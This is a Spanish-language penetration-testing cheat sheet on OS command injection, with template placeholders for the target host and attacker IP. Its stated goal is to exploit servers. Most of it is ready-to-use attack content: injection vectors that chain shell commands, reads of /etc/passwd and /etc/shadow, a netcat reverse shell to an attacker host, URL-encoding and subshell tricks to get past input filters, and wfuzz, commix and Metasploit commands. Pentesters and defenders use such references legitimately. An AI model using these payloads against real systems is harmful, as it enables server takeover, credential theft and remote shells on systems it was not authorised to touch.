# CheatSheet: OS Command Injection

## Fecha: 22/01/2025
## Host: {HOST}
## IP: {IP}

---

## Objetivo
Identificar y explotar vulnerabilidades de inyección de comandos del sistema operativo 
para ejecutar comandos arbitrarios en el servidor objetivo y comprometer su seguridad.

---
## Herramientas
1. Burp Suite
2. OWASP ZAP
3. Metasploit

---
## Procedimiento y comandos

1. **Identificar campos vulnerables**:
   - Probar entradas que interactúen con el sistema:
     ```
     http://{HOST}/?cmd=ls
     ```

2. **Probar vectores comunes**:
   - Concatenación de comandos:
     ```
     ; ls
     && whoami
     | uname -a
     ```
   - Comandos con redirección:
     ```
     | cat /etc/passwd
     ```

3. **Automatización de pruebas**:
   - Usar herramientas para identificar parámetros vulnerables:
     ```bash
     wfuzz -c -z file,/path/to/wordlist.txt "http://{HOST}/?cmd=FUZZ"
     ```

4. **Escalación de impacto**:
   - Leer archivos sensibles:
     ```
     cat /etc/shadow
     ```
   - Conexión inversa:
     ```bash
     nc -e /bin/bash {ATTACKER_IP} {PORT}
     ```

---
## Troubleshooting
1. **Filtros que bloquean caracteres especiales**:
   - Usar codificación para evadirlos:
     ```
     %26%26 whoami
     %3B ls
     ```
   - Probar envoltorios alternativos para comandos:
     ```bash
     $(whoami)
     `uname -a`
     ```

2. **El comando no se ejecuta**:
   - Comprobar si los resultados son visibles en la respuesta del servidor.
   - Analizar con herramientas proxy como Burp Suite para observar el comportamiento del servidor.

3. **Protecciones del sistema**:
   - Si se usan funciones como escapeshellcmd, buscar vectores alternativos.
   - Examinar las respuestas en busca de indicadores de sanitización insuficiente.

---
## Herramientas Alternativas
- [ ] **Commix**: Automatización para detección de inyección de comandos.
  ```bash
  commix --url="http://{HOST}/?cmd=exploit"
  ```
- [ ] **Metasploit**: Módulos específicos para OS command injection.
  ```bash
  use exploit/unix/webapp/command_injection
  ```
- [ ] **Wfuzz**: Identificación de parámetros vulnerables.
  ```bash
  wfuzz -c -z file,/path/to/wordlist.txt "http://{HOST}/?cmd=FUZZ"
  ```


